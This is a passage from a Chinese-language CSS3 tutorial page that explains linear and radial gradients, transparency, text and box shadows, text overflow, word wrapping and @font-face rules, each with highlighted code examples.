class="hljs-number">180deg</span>, red, blue); <span class="hljs-comment">/* Opera 11.1 - 12.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-moz-linear-gradient</span>(<span class="hljs-number">180deg</span>, red, blue); <span class="hljs-comment">/* Firefox 3.6 - 15 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">180deg</span>, red, blue); <span class="hljs-comment">/* 标准的语法 */</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-3-多个颜色节点"><a href="#4-3-多个颜色节点" class="headerlink" title="4.3 多个颜色节点"></a>4.3 多个颜色节点</h3><p>设置多个颜色结点。</p><p>使用实例：带有多个颜色结点的从上到下的线性渐变</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-id">#grad</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-webkit-linear-gradient</span>(red, green, blue); <span class="hljs-comment">/* Safari 5.1 - 6.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-o-linear-gradient</span>(red, green, blue); <span class="hljs-comment">/* Opera 11.1 - 12.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-moz-linear-gradient</span>(red, green, blue); <span class="hljs-comment">/* Firefox 3.6 - 15 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(red, green, blue); <span class="hljs-comment">/* 标准的语法 */</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>使用实例：创建一个带有彩虹颜色和文本的线性渐变</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-id">#grad</span> &#123;<br>  <span class="hljs-comment">/* Safari 5.1 - 6.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-webkit-linear-gradient</span>(left,red,orange,yellow,green,blue,indigo,violet);<br> <span class="hljs-comment">/* Opera 11.1 - 12.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-o-linear-gradient</span>(left,red,orange,yellow,green,blue,indigo,violet);<br>  <span class="hljs-comment">/* Firefox 3.6 - 15 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-moz-linear-gradient</span>(left,red,orange,yellow,green,blue,indigo,violet);<br> <span class="hljs-comment">/* 标准的语法 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(to right, red,orange,yellow,green,blue,indigo,violet);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-4-透明度（Transparency）"><a href="#4-4-透明度（Transparency）" class="headerlink" title="4.4 透明度（Transparency）"></a>4.4 透明度（Transparency）</h3><p>CSS3 渐变也支持透明度（transparency），可用于创建减弱变淡的效果。为了添加透明度，使用 rgba() 函数来定义颜色结点。rgba() 函数中的最后一个参数可以是从 0 到 1 的值，它定义了颜色的透明度：0 表示完全透明，1 表示完全不透明。</p><p>使用实例：从左到右的线性渐变，带有透明度</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-id">#grad</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-webkit-linear-gradient</span>(left,<span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>),<span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)); <span class="hljs-comment">/* Safari 5.1 - 6 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-o-linear-gradient</span>(right,<span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>),<span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)); <span class="hljs-comment">/* Opera 11.1 - 12*/</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-moz-linear-gradient</span>(right,<span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>),<span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)); <span class="hljs-comment">/* Firefox 3.6 - 15*/</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(to right, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>), <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)); <span class="hljs-comment">/* 标准的语法 */</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-5-重复的线性渐变"><a href="#4-5-重复的线性渐变" class="headerlink" title="4.5 重复的线性渐变"></a>4.5 重复的线性渐变</h3><p>repeating-linear-gradient() 函数用于重复线性渐变。</p><p>使用实例：一个重复的线性渐变</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-id">#grad</span> &#123;<br>  <span class="hljs-comment">/* Safari 5.1 - 6.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-webkit-repeating-linear-gradient</span>(red, yellow <span class="hljs-number">10%</span>, green <span class="hljs-number">20%</span>);<br>  <span class="hljs-comment">/* Opera 11.1 - 12.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-o-repeating-linear-gradient</span>(red, yellow <span class="hljs-number">10%</span>, green <span class="hljs-number">20%</span>);<br>  <span class="hljs-comment">/* Firefox 3.6 - 15 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-moz-repeating-linear-gradient</span>(red, yellow <span class="hljs-number">10%</span>, green <span class="hljs-number">20%</span>);<br>  <span class="hljs-comment">/* 标准的语法 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">repeating-linear-gradient</span>(red, yellow <span class="hljs-number">10%</span>, green <span class="hljs-number">20%</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-6-径向渐变"><a href="#4-6-径向渐变" class="headerlink" title="4.6 径向渐变"></a>4.6 径向渐变</h3><p>径向渐变由它的中心定义。为了创建一个径向渐变，必须至少定义两种颜色结点。颜色结点即你想要呈现平稳过渡的颜色。同时，可以指定渐变的中心、形状（圆形或椭圆形）、大小。默认情况下，渐变的中心是 center（表示在中心点），渐变的形状是 ellipse（表示椭圆形），渐变的大小是 farthest-corner（表示到最远的角落）。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-attribute">background</span>: <span class="hljs-built_in">radial-gradient</span>(center, shape size, start-color, ..., last-color);  <br></code></pre></div></td></tr></table></figure><h4 id="4-6-1-颜色结点均匀分布（默认情况下）。"><a href="#4-6-1-颜色结点均匀分布（默认情况下）。" class="headerlink" title="4.6.1 颜色结点均匀分布（默认情况下）。"></a>4.6.1 颜色结点均匀分布（默认情况下）。</h4><p>使用实例：颜色结点均匀分布的径向渐变</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-id">#grad</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-webkit-radial-gradient</span>(red, green, blue); <span class="hljs-comment">/* Safari 5.1 - 6.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-o-radial-gradient</span>(red, green, blue); <span class="hljs-comment">/* Opera 11.6 - 12.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-moz-radial-gradient</span>(red, green, blue); <span class="hljs-comment">/* Firefox 3.6 - 15 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">radial-gradient</span>(red, green, blue); <span class="hljs-comment">/* 标准的语法 */</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="4-6-2-颜色结点不均匀分布"><a href="#4-6-2-颜色结点不均匀分布" class="headerlink" title="4.6.2 颜色结点不均匀分布"></a>4.6.2 颜色结点不均匀分布</h4><p>使用实例：颜色结点不均匀分布的径向渐变</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-id">#grad</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-webkit-radial-gradient</span>(red <span class="hljs-number">5%</span>, green <span class="hljs-number">15%</span>, blue <span class="hljs-number">60%</span>); <span class="hljs-comment">/* Safari 5.1 - 6.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-o-radial-gradient</span>(red <span class="hljs-number">5%</span>, green <span class="hljs-number">15%</span>, blue <span class="hljs-number">60%</span>); <span class="hljs-comment">/* Opera 11.6 - 12.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-moz-radial-gradient</span>(red <span class="hljs-number">5%</span>, green <span class="hljs-number">15%</span>, blue <span class="hljs-number">60%</span>); <span class="hljs-comment">/* Firefox 3.6 - 15 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">radial-gradient</span>(red <span class="hljs-number">5%</span>, green <span class="hljs-number">15%</span>, blue <span class="hljs-number">60%</span>); <span class="hljs-comment">/* 标准的语法 */</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-7-形状"><a href="#4-7-形状" class="headerlink" title="4.7 形状"></a>4.7 形状</h3><p>shape 参数定义了形状。它可以是值 circle 或 ellipse。其中，circle 表示圆形，ellipse 表示椭圆形。默认值是 ellipse。</p><p>使用实例：形状为圆形的径向渐变</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-id">#grad</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-webkit-radial-gradient</span>(circle, red, yellow, green); <span class="hljs-comment">/* Safari 5.1 - 6.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-o-radial-gradient</span>(circle, red, yellow, green); <span class="hljs-comment">/* Opera 11.6 - 12.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-moz-radial-gradient</span>(circle, red, yellow, green); <span class="hljs-comment">/* Firefox 3.6 - 15 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">radial-gradient</span>(circle, red, yellow, green); <span class="hljs-comment">/* 标准的语法 */</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-8-不同尺寸大小关键字的使用"><a href="#4-8-不同尺寸大小关键字的使用" class="headerlink" title="4.8 不同尺寸大小关键字的使用"></a>4.8 不同尺寸大小关键字的使用</h3><p>size 参数定义了渐变的大小。它可以是以下四个值：</p><blockquote><ol><li>closest-side</li><li>farthest-side</li><li>closest-corner</li><li>farthest-corner</li></ol></blockquote><p>使用实例：带有不同尺寸大小关键字的径向渐变</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-id">#grad1</span> &#123;<br>  <span class="hljs-comment">/* Safari 5.1 - 6.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-webkit-radial-gradient</span>(<span class="hljs-number">60%</span> <span class="hljs-number">55%</span>, closest-side,blue,green,yellow,black);<br>  <span class="hljs-comment">/* Opera 11.6 - 12.0 */</span><br> <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-o-radial-gradient</span>(<span class="hljs-number">60%</span> <span class="hljs-number">55%</span>, closest-side,blue,green,yellow,black);<br> <span class="hljs-comment">/* Firefox 3.6 - 15 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-moz-radial-gradient</span>(<span class="hljs-number">60%</span> <span class="hljs-number">55%</span>, closest-side,blue,green,yellow,black);<br>  <span class="hljs-comment">/* 标准的语法 */</span><br> <span class="hljs-attribute">background</span>: <span class="hljs-built_in">radial-gradient</span>(<span class="hljs-number">60%</span> <span class="hljs-number">55%</span>, closest-side,blue,green,yellow,black);<br>&#125;<br><br><span class="hljs-selector-id">#grad2</span> &#123;<br> <span class="hljs-comment">/* Safari 5.1 - 6.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-webkit-radial-gradient</span>(<span class="hljs-number">60%</span> <span class="hljs-number">55%</span>, farthest-side,blue,green,yellow,black);<br> <span class="hljs-comment">/* Opera 11.6 - 12.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-o-radial-gradient</span>(<span class="hljs-number">60%</span> <span class="hljs-number">55%</span>, farthest-side,blue,green,yellow,black);<br>  <span class="hljs-comment">/* Firefox 3.6 - 15 */</span><br> <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-moz-radial-gradient</span>(<span class="hljs-number">60%</span> <span class="hljs-number">55%</span>, farthest-side,blue,green,yellow,black);<br> <span class="hljs-comment">/* 标准的语法 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">radial-gradient</span>(<span class="hljs-number">60%</span> <span class="hljs-number">55%</span>, farthest-side,blue,green,yellow,black);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-9-重复的径向渐变"><a href="#4-9-重复的径向渐变" class="headerlink" title="4.9 重复的径向渐变"></a>4.9 重复的径向渐变</h3><p>repeating-radial-gradient() 函数用于重复径向渐变。</p><p>使用实例：一个重复的径向渐变</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-id">#grad</span> &#123;<br>  <span class="hljs-comment">/* Safari 5.1 - 6.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-webkit-repeating-radial-gradient</span>(red, yellow <span class="hljs-number">10%</span>, green <span class="hljs-number">15%</span>);<br>  <span class="hljs-comment">/* Opera 11.6 - 12.0 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-o-repeating-radial-gradient</span>(red, yellow <span class="hljs-number">10%</span>, green <span class="hljs-number">15%</span>);<br>  <span class="hljs-comment">/* Firefox 3.6 - 15 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">-moz-repeating-radial-gradient</span>(red, yellow <span class="hljs-number">10%</span>, green <span class="hljs-number">15%</span>);<br>  <span class="hljs-comment">/* 标准的语法 */</span><br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">repeating-radial-gradient</span>(red, yellow <span class="hljs-number">10%</span>, green <span class="hljs-number">15%</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="5-文本效果"><a href="#5-文本效果" class="headerlink" title="5. 文本效果"></a>5. 文本效果</h2><p>CSS3中包含几个新的文本特征。</p><blockquote><ol><li>text-shadow</li><li>box-shadow</li><li>text-overflow</li><li>word-wrap</li><li>word-break</li></ol></blockquote><p>文本属性：</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th><th align="center">CSS</th></tr></thead><tbody><tr><td align="center">hanging-punctuation</td><td align="center">规定标点字符是否位于线框之外。</td><td align="center">3</td></tr><tr><td align="center">punctuation-trim</td><td align="center">规定是否对标点字符进行修剪。</td><td align="center">3</td></tr><tr><td align="center">text-align-last</td><td align="center">设置如何对齐最后一行或紧挨着强制换行符之前的行。</td><td align="center">3</td></tr><tr><td align="center">text-emphasis</td><td align="center">向元素的文本应用重点标记以及重点标记的前景色。</td><td align="center">3</td></tr><tr><td align="center">text-justify</td><td align="center">规定当  text-align 设置为 “justify” 时所使用的对齐方法。</td><td align="center">3</td></tr><tr><td align="center">text-outline</td><td align="center">规定文本的轮廓。</td><td align="center">3</td></tr><tr><td align="center">text-overflow</td><td align="center">规定当文本溢出包含元素时发生的事情。</td><td align="center">3</td></tr><tr><td align="center">text-shadow</td><td align="center">向文本添加阴影。</td><td align="center">3</td></tr><tr><td align="center">text-wrap</td><td align="center">规定文本的换行规则。</td><td align="center">3</td></tr><tr><td align="center">word-break</td><td align="center">规定非中日韩文本的换行规则。</td><td align="center">3</td></tr><tr><td align="center">word-wrap</td><td align="center">允许对长的不可分割的单词进行分割并换行到下一行。</td><td align="center">3</td></tr></tbody></table><h3 id="5-1-文本阴影（text-shadow）"><a href="#5-1-文本阴影（text-shadow）" class="headerlink" title="5.1 文本阴影（text-shadow）"></a>5.1 文本阴影（text-shadow）</h3><p>text-shadow属性适用于文本阴影。指定了水平阴影，垂直阴影，模糊的距离，以及阴影的颜色。</p><p>使用实例：给标题添加阴影</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span>&#123;<br>    <span class="hljs-attribute">text-shadow</span>: <span class="hljs-number">5px</span> <span class="hljs-number">5px</span> <span class="hljs-number">5px</span> <span class="hljs-number">#FF0000</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="5-2-盒子阴影（box-shadow）"><a href="#5-2-盒子阴影（box-shadow）" class="headerlink" title="5.2 盒子阴影（box-shadow）"></a>5.2 盒子阴影（box-shadow）</h3><p>box-shadow 属性适用于盒子阴影。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123; <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">10px</span> <span class="hljs-number">10px</span>;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="5-3-阴影添加颜色"><a href="#5-3-阴影添加颜色" class="headerlink" title="5.3 阴影添加颜色"></a>5.3 阴影添加颜色</h3><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123; <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">10px</span> <span class="hljs-number">10px</span> grey;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="5-4-阴影添加模糊效果"><a href="#5-4-阴影添加模糊效果" class="headerlink" title="5.4 阴影添加模糊效果"></a>5.4 阴影添加模糊效果</h3><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123; <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">10px</span> <span class="hljs-number">10px</span> <span class="hljs-number">5px</span> grey;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="5-5-在-before-和-after-两个伪元素中添加阴影效果"><a href="#5-5-在-before-和-after-两个伪元素中添加阴影效果" class="headerlink" title="5.5 在 ::before 和 ::after 两个伪元素中添加阴影效果"></a>5.5 在 ::before 和 ::after 两个伪元素中添加阴影效果</h3><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-id">#boxshadow</span> &#123; <br>    <span class="hljs-attribute">position</span>: relative; <br>    <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">1px</span> <span class="hljs-number">2px</span> <span class="hljs-number">4px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, .<span class="hljs-number">5</span>); <br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>; bac kground: white;<br>&#125; <br><span class="hljs-selector-id">#boxshadow</span> <span class="hljs-selector-tag">img</span> &#123; <br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>; <br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#8a4419</span>; <br>    <span class="hljs-attribute">border-style</span>: inset;<br>&#125; <br><span class="hljs-selector-id">#boxshadow</span><span class="hljs-selector-pseudo">::after</span> &#123; <br>    <span class="hljs-attribute">content</span>: <span class="hljs-string">&#x27;&#x27;</span>; <br>    <span class="hljs-attribute">position</span>: absolute; <br>    <span class="hljs-attribute">z-index</span>: -<span class="hljs-number">1</span>; <span class="hljs-comment">/* hide shadow behind image */</span> <br>    <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">15px</span> <span class="hljs-number">20px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.3</span>); <br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">70%</span>; <br>    <span class="hljs-attribute">left</span>: <span class="hljs-number">15%</span>; <span class="hljs-comment">/* one half of the remaining 30% */</span> <br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>; <br>    <span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="5-6-显示溢出内容（text-overflow）"><a href="#5-6-显示溢出内容（text-overflow）" class="headerlink" title="5.6 显示溢出内容（text-overflow）"></a>5.6 显示溢出内容（text-overflow）</h3><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.test1</span> &#123; <br>    <span class="hljs-attribute">white-space</span>: nowrap; <br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>; <br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#000000</span>; <br>    <span class="hljs-attribute">overflow</span>: hidden; <br>    <span class="hljs-attribute">text-overflow</span>: clip; <br>&#125; <br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.test2</span> &#123; <br>    <span class="hljs-attribute">white-space</span>: nowrap; <br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>; <br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#000000</span>; <br>    <span class="hljs-attribute">overflow</span>: hidden; <br>    <span class="hljs-attribute">text-overflow</span>: ellipsis; <br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="5-7-换行"><a href="#5-7-换行" class="headerlink" title="5.7 换行"></a>5.7 换行</h3><p>如果某个单词太长，不适合在一个区域内，它扩展到外面：CSS3中，自动换行属性允许强制文本换行 - 即使这意味着分裂它中间的一个字。</p><p>使用实例：允许长文本换行</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">word-wrap</span>:break-word;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="5-8-单词拆分换行"><a href="#5-8-单词拆分换行" class="headerlink" title="5.8 单词拆分换行"></a>5.8 单词拆分换行</h3><p>单词拆分换行属性指定换行规则。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.test1</span> &#123; <br>    <span class="hljs-attribute">word-break</span>: keep-all;<br>&#125; <br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.test2</span> &#123; <br>    <span class="hljs-attribute">word-break</span>: break-all;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="6-字体"><a href="#6-字体" class="headerlink" title="6.字体"></a>6.字体</h2><p>所有的字体描述和@font-face规则定义。</p><h3 id="6-1-font-face-规则"><a href="#6-1-font-face-规则" class="headerlink" title="6.1 @font-face 规则"></a>6.1 @font-face 规则</h3><p>必须首先定义字体的名称（比如 myFirstFont），然后指向该字体文件。URL请使用小写字母的字体，大写字母在IE中会产生意外的结果。如果需要为 HTML 元素使用字体，需要通过 font-family 属性来引用字体的名称 (myFirstFont)。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">&lt;style&gt;<br><span class="hljs-keyword">@font-face</span>&#123;<br>   <span class="hljs-attribute">font-family</span>: myFirstFont;<br>   <span class="hljs-attribute">src</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">sansation_light.woff</span>);<br>&#125;<br><br><span class="hljs-selector-tag">div</span>&#123;<br>   <span class="hljs-attribute">font-family</span>:myFirstFont;<br>&#125;<br>&lt;/style&gt;<br></code></pre></div></td></tr></table></figure><h3 id="6-2-粗体文本"><a href="#6-2-粗体文本" class="headerlink" title="6.2 粗体文本"></a>6.2 粗体文本</h3><p>必须添加另一个包含粗体文字的@font-face规则。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-keyword">@font-face</span>&#123;<br>   <span class="hljs-attribute">font-family</span>: myFirstFont;<br>   <span class="hljs-attribute">src</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">sansation_bold.woff</span>);<br>   <span 